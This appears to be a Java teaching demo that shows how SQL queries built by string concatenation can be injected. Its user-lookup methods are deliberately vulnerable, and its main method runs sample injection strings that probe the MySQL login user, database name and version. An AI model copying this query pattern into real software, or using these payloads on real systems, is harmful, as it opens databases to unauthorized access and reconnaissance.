package org.net5ijy.jdbc;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.net5ijy.jdbc.util.DBUtil;

/**
 * 演示使用字符串拼接方式执行“动态”SQL语句，以及SQL注入获取MySQL登陆用户、库、版本
 */
public class UserDaoOld {

	public Map<String, Object> getUserInfoById(int id) throws SQLException {

		// 拼接sql字符串
		String sql = "select id, username, role_id from t_user where id = "
				+ id;

		Connection conn = null;
		Statement stmt = null;
		ResultSet rs = null;

		try {
			// 获取连接
			conn = DBUtil.getConnection();

			stmt = conn.createStatement();
			// 执行查询并获取结果集
			rs = stmt.executeQuery(sql);

			Map<String, Object> user = new HashMap<String, Object>();

			// 遍历结果集，封装数据并返回
			if (rs.next()) {
				String uname = rs.getString("username");
				int roleId = rs.getInt(3);
				user.put("id", id);
				user.put("username", uname);
				user.put("role_id", roleId);
			}
			return user;

		} catch (SQLException e) {
			// 可以把异常抛给业务层的调用者
			throw e;
		} finally {
			// 关闭连接，释放资源
			try {
				if (conn != null)
					conn.close();
				if (stmt != null)
					stmt.close();
				if (rs != null)
					rs.close();
			} catch (SQLException e) {
			}
		}
	}

	public List<Map<String, Object>> getUsersInfoByName(String name)
			throws SQLException {

		// 拼接sql字符串
		String sql = "select id, username, role_id from t_user where username like '%"
				+ name + "%'";

		System.out.println(sql);

		Connection conn = null;
		Statement stmt = null;
		ResultSet rs = null;

		try {
			// 获取连接
			conn = DBUtil.getConnection();

			stmt = conn.createStatement();
			// 执行查询并获取结果集
			rs = stmt.executeQuery(sql);

			List<Map<String, Object>> users = new ArrayList<Map<String, Object>>();

			// 遍历结果集，封装数据并返回
			while (rs.next()) {
				Map<String, Object> user = new HashMap<String, Object>();
				user.put("id", rs.getInt(1));
				user.put("username", rs.getString("username"));
				user.put("role_id", rs.getInt(3));

				users.add(user);
			}
			return users;
		} catch (SQLException e) {
			// 可以把异常抛给业务层的调用者
			throw e;
		} finally {
			// 关闭连接，释放资源
			try {
				if (conn != null)
					conn.close();
				if (stmt != null)
					stmt.close();
				if (rs != null)
					rs.close();
			} catch (SQLException e) {
			}
		}
	}

	public static void main(String[] args) throws Exception {
		UserDaoOld uDao = new UserDaoOld();

		// 正常使用
		// select id, username, role_id from t_user where username like '%admin%'
		List<Map<String, Object>> users = uDao.getUsersInfoByName("admin");
		for (Map<String, Object> u : users) {
			System.out.println(u);
		}

		users.clear();
		// SQL注入获取MySQL登陆用户
		// 这样使用者就可以知道服务器使用的是root用户了
		// select id, username, role_id from t_user where username like '%!@#$%^%' or user() like '%root%'
		users = uDao.getUsersInfoByName("!@#$%^%' or user() like '%root");
		for (Map<String, Object> u : users) {
			System.out.println(u);
		}

		users.clear();
		// SQL注入获取MySQL库
		// select id, username, role_id from t_user where username like '%!@#$%^%' or database() like '%test%'
		users = uDao.getUsersInfoByName("!@#$%^%' or database() like '%test");
		for (Map<String, Object> u : users) {
			System.out.println(u);
		}
		
		users.clear();
		// SQL注入获取MySQL库
		// select id, username, role_id from t_user where username like '%!@#$%^%' or version() like '%5.5%'
		users = uDao.getUsersInfoByName("!@#$%^%' or version() like '%5.5");
		for (Map<String, Object> u : users) {
			System.out.println(u);
		}
	}
}
